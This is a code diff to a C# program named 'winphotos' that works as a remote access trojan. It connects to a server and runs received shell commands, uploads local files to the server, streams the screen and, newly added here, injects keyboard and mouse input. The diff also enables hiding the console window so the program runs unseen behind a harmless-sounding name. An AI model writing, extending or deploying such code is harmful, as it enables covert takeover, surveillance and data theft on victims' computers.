@@ -1,28 +1,17 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading.Tasks;
 
 namespace winphotos
 {
     class Program
     {
-        [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto, SetLastError = true)]
-        static extern uint GetFileAttributes(string lpFileName);
-        [System.Runtime.InteropServices.DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
-
-        const uint FILE_ATTRIBUTE_DIRECTORY = 0x10;
-        const uint INVALID_FILE_ATTRIBUTES = 0xffffffff;
         static void Main()
         {
-            //ShowWindow(GetConsoleWindow(), 0);
+            ShowWindow(GetConsoleWindow(), 0);
             ServerConnection.ConnectToServer();
             while (true) 
             {
@@ -37,16 +26,16 @@ namespace winphotos
                     }
                     if (Buffer[0] == 0) // Cmd command
                     {
-                        string Command = Encoding.ASCII.GetString(Buffer, 1, Received-1);// Skip the first code byte
+                        string Command = Encoding.ASCII.GetString(Buffer, 1, Received - 1);// Skip the first code byte
                         bool Executed = ExecuteCommand(Command, out string Output);
                         if (!Executed)
                             Output = "Failed to execute command (terminated the thread).";
                         byte[] ResponseBuffer = Encoding.ASCII.GetBytes(Output);
                         ServerConnection.Socket.Send(ResponseBuffer);
                     }
-                    else if(Buffer[0] == 1) // Upload file to server
+                    else if (Buffer[0] == 1) // Upload file to server
                     {
-                        string FileName = Encoding.ASCII.GetString(Buffer, 1, Received-1);
+                        string FileName = Encoding.ASCII.GetString(Buffer, 1, Received - 1);
                         Console.WriteLine("Upload file to server " + FileName);
                         uint fileAttribues = GetFileAttributes(FileName);
                         bool fileExists = fileAttribues != INVALID_FILE_ATTRIBUTES && fileAttribues != FILE_ATTRIBUTE_DIRECTORY;
@@ -70,19 +59,23 @@ namespace winphotos
                             }
                             stream.Close();
                         }
-                        catch 
+                        catch
                         {
                             if (stream != null)
                                 stream.Close();
                         }
-                        
+
                     }
-                    else if(Buffer[0] == 3)
+                    else if (Buffer[0] == 3) // Share screen
                     {
                         byte code = Buffer[1];
                         Console.WriteLine("Share screen: " + (code == 1));
                         if (code == 0) ShareScreen.Running = false;
-                        else if(!ShareScreen.Running) ShareScreen.StartShareScreen();
+                        else if (!ShareScreen.Running) ShareScreen.StartShareScreen();
+                    }
+                    else if (Buffer[0] == 4) // Input injection
+                    {
+                        Input.Inject(Buffer);
                     }
                 }
                 catch (SocketException)
@@ -146,5 +139,15 @@ namespace winphotos
             Output = output;
             return Done;
         }
+
+        [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto, SetLastError = true)]
+        static extern uint GetFileAttributes(string lpFileName);
+        [System.Runtime.InteropServices.DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        const uint FILE_ATTRIBUTE_DIRECTORY = 0x10;
+        const uint INVALID_FILE_ATTRIBUTES = 0xffffffff;
     }
 }
